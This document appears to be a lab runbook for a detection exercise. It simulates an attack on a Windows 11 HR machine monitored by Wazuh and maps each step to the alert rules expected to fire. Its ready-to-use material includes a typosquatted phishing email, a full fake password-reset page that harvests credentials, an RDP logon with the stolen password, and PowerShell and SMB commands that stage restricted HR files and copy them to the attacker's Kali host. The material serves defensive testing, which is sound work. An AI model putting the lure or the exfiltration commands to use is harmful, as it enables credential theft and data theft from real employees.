# Scenario 2 — Simulation Commands (verified, 19 Aug 2026 live run)

Attacker machine: Kali (`192.168.100.20`). Target: Employee-Normal (`192.168.100.10`). 
Detection engine: Wazuh 4.14.6 · Target OS: Windows 11

---

### 0. Social Engineering — Phishing Email Delivery
#### 1. Sending a Phishing Email to the target (HR Employee)
Before any technical access is attempted, a phishing email is sent from a spoofed address to trick the HR employee into visiting the fake password reset page.

**Email details:**
- **From:** IT-Support@meridianhold1ngs.com ← (typosquatted — '1' instead of 'i')
- **To:** HR Employee
- **Subject:** Action Required: Password Update Policy 2026 — 48 Hours Remaining
- **Body:**
  
As part of our biannual password security policy, all employees are required
to update their account password. To avoid account suspension, please update
your password within 48 hours by clicking the link below.

→ http://192.168.100.20 [Reset Password Now]

If you did not request this, please contact IT Support immediately.

Regards,
Meridian Holdings IT Security Team

This is an automated message. Please do not reply directly to this email.

---
#### 2. Set up a basic index.html with a form posting to a simple PHP/Python capture script

##### Index.html:
``` html
<!DOCTYPE html>
<html>
<head>
<title>Meridian Holdings - Password Reset</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
  body {
    font-family: Arial, Helvetica, sans-serif;
    background-color: #f3f4f6;
    margin: 0;
    padding: 0;
  }
  .header {
    background-color: #1F3864;
    padding: 18px 40px;
  }
  .header h1 {
    color: #ffffff;
    font-size: 20px;
    margin: 0;
    font-weight: 600;
  }
  .container {
    max-width: 420px;
    margin: 60px auto;
    background-color: #ffffff;
    border-radius: 8px;
    box-shadow: 0 1px 4px rgba(0,0,0,0.12);
    padding: 40px 36px;
  }
  .container h2 {
    color: #1F3864;
    font-size: 22px;
    margin-top: 0;
    margin-bottom: 8px;
  }
  .subtext {
    color: #555555;
    font-size: 13px;
    margin-bottom: 28px;
    line-height: 1.5;
  }
  .notice {
    background-color: #FFF2CC;
    border-left: 4px solid #C9A227;
    color: #6b5a00;
    font-size: 12.5px;
    padding: 10px 14px;
    margin-bottom: 24px;
    border-radius: 4px;
  }
  label {
    display: block;
    font-size: 13px;
    color: #333333;
    margin-bottom: 6px;
    font-weight: 600;
  }
  input[type="text"], input[type="password"] {
    width: 100%;
    padding: 10px 12px;
    margin-bottom: 18px;
    border: 1px solid #cccccc;
    border-radius: 5px;
    font-size: 14px;
    box-sizing: border-box;
  }
  input[type="text"]:focus, input[type="password"]:focus {
    outline: none;
    border-color: #1F3864;
  }
  button {
    width: 100%;
    background-color: #2E5C8A;
    color: #ffffff;
    border: none;
    padding: 12px;
    border-radius: 5px;
    font-size: 15px;
    font-weight: 600;
    cursor: pointer;
  }
  button:hover {
    background-color: #1F3864;
  }
  .footer {
    text-align: center;
    font-size: 11px;
    color: #999999;
    margin-top: 26px;
  }
</style>
</head>
<body>

<div class="header">
  <h1>Meridian Holdings</h1>
</div>

<div class="container">
  <h2>Reset Your Password</h2>
  <p class="subtext">As part of our biannual password security policy, please confirm your current credentials to continue with your password reset.</p>

  <div class="notice">
    Your account will be temporarily locked if this step is not completed within 48 hours.
  </div>

  <form action="/capture.php" method="POST">
    <label for="username">Employee Username</label>
    <input type="text" id="username" name="username" placeholder="e.g. jsmith" required>

    <label for="password">Current Password</label>
    <input type="password" id="password" name="password" placeholder="Enter current password" required>

    <button type="submit">Continue to Reset</button>
  </form>

  <div class="footer">
    &copy; 2026 Meridian Holdings &middot; IT Security Team<br>
    This is an automated message. Please do not reply directly.
  </div>
</div>

</body>
</html>
```

---
### 1. Credential harvesting through a fake reset password page
##### 1. Start the PHP web server 
```
php -S 192.168.100.20:80
```

##### 2. After the HR employee submits credentials, check the capture file

```
cat ~/hrlogin/captured_creds.txt
# Expected: Username: Shjoon Almutairi | Password: <captured> | Time: 2026-08-19 23:xx:xx
```

---

### 2. Off-Hours Timing

All attacker activity is timed for **11 pm – 2 am** to simulate a real attacker avoiding
business-hours detection. No separate command needed — run all subsequent steps
during the 23:00–02:00 window.

> **Expected Wazuh alert:** Rules 100103 / 100104 — off-hours logon detected
> (same shared rule as Scenario 1, fires on the attacker's RDP session).

---

### 3. Remote Authentication via Stolen Credentials (Kali)

```
xfreerdp /v:192.168.100.10 /u:"Shjoon Almutairi" /p:<captured-password> /cert:ignore
```

> **Expected Wazuh alert:** Rule 100026 — RDP logon from attacker-net IP 192.168.100.20
> (Event 4624 Logon Type 10). This is the **first detectable event** in the entire chain.

---

### 4. Data Staging — Compress Sensitive Files (inside RDP session on HR VM)

```powershell
# Run inside the RDP session — PowerShell
Compress-Archive -Path "C:\Corporate_Shares\HR_Department\02_Restricted_Executive_HR\*" `
  -DestinationPath "C:\Corporate_Shares\HR_Department\02_Restricted_Executive_HR\staged_data.zip"
```

> **Expected Wazuh alert:** Built-in FIM Rules 554 (file added) then 550 (checksum changed)
> as staged_data.zip is created and finalized in the monitored directory.

---

### 5. Stand Up SMB Exfil Listener (Kali on second terminal)

```
mkdir -p /home/kali/exfil
sudo impacket-smbserver exfil /home/kali/exfil -smb2support -username kali -password kali123
```

---

### 6. Connect and Exfiltrate via SMB (inside RDP session on HR VM)

```cmd
:: Mount the Kali SMB share
net use \\192.168.100.20\exfil /user:kali kali123

:: Copy the archive across
cmd /c "copy C:\Corporate_Shares\HR_Department\02_Restricted_Executive_HR\staged_data.zip \\192.168.100.20\exfil\staged_data.zip"
```

> **Expected Wazuh alerts (in order):**
> 1. Rule 100028 — Event 5156, outbound SMB connection permitted to 192.168.100.20:445
> 2. Rule 100027 — Event 4648, explicit credential logon as 'kali' (~3ms after 100028 — connection opens before authentication, correct SMB order)

---

### 7. Verify Exfiltrated Data (Kali)

```
ls -lh /home/kali/exfil/
# Expected: staged_data.zip (several MB)

cd /home/kali/exfil
unzip staged_data.zip
ls

# Open the exfiltrated file to confirm contents are readable
libreoffice "ProjectPhoenix_DueDiligence_CONFIDENTIAL.xlsx"
```

---

### Expected Dashboard Evidence — In Order

| # | Rule / Source | What it means |
|---|---|---|
| 1 | — (no alert) | Phishing email + credential submission — outside monitored boundary |
| 2 | 100026 (custom) | RDP logon from 192.168.100.20 — first detectable signal |
| 3 | 100103 / 100104 (shared) | Off-hours logon — same rule as Scenario 1 |
| 4 | FIM 554 / 550 (built-in) | staged_data.zip created and finalized in monitored directory |
| 5 | 100028 (custom) | Outbound SMB connection to 192.168.100.20:445 |
| 6 | 100027 (custom) | Explicit credential logon as 'kali' confirming SMB auth |

---

> Passwords shown as `<captured-password>` and `<redacted>`.
> Real credentials are in the team's private setup notes, not this repo.Passwords shown as `<redacted>` here — real values are in the team's
private setup notes, not this public-facing repo.
